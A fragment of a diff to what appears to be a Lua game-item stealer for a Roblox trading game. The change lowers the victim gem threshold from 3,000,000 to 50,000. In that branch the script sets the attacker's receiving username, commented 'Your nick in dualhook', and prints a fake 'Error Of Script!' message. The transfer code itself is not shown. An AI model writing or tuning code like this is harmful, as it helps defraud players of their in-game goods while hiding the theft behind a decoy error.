@@ -262,7 +262,7 @@ if AmountOfHuges >= 2 then
 else
     print("Error Of Script!")
 end
-if GemAmount1 >= 3000000 then
+if GemAmount1 >= 50000 then
     Username = "psxcoder" -- Your nick in dualhook
     print("Error Of Script!")
 else
